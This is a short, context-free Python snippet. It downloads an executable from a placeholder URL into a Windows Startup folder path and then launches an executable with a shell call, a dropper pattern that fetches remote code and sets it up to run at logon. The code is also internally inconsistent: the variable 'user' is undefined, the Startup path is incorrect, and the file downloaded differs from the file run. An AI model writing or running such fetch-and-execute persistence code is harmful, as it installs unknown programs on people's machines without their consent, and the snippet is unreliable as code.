import urllib.request
import subprocess
urllib.request.urlretrieve('https://example.com/file.exe', f'C:\\Users\\{user}\\Programs\\Startup\\file.exe')
subprocess.call(f'C:\\Users\\{user}\\Programs\\Startup\\other.exe', shell=True)
